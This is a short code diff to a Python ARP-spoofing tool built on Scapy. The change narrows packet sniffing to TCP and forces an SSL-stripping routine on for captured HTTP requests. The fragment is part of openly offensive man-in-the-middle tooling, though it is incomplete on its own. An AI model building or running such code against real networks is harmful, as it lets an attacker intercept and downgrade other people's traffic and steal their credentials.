@@ -109,9 +109,10 @@ class ARPSpoof(threading.Thread):
         return
 
     def packet_forwarding(self):
-        packet = sniff(iface = 'eth0', count = 1)
+        packet = sniff(iface = 'eth0', filter = "tcp", count = 1)
         print(packet.summary())
         print("DAME RE") 
+        self.SSL_Strip_Activation = True
         if self.SSL_Strip_Activation:
             if packet.haslayer(HTTPRequest):
                 self.ssl_strip(packet)
